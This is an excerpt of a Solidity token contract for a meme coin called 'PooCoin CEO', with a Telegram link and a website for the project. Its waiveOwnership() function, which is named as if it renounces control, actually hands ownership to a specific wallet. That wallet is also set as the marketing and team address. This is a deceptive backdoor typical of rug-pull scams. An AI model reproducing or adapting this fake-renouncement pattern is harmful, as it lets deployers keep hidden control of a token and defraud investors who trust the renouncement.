...
Telegram:https://t.me/+7hFnrOjW7P03OGY0
Website: https://poocoinceo.site.xyz/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x3980BF42fBA8879e6AaaCA57E09825D20870FF50);
    }
...
contract PooCoinCEO is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PooCoin CEO";
    string private _symbol = "POOCOIN CEO";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x3980BF42fBA8879e6AaaCA57E09825D20870FF50);
    address payable private teamWalletAddress = payable(0x3980BF42fBA8879e6AaaCA57E09825D20870FF50);
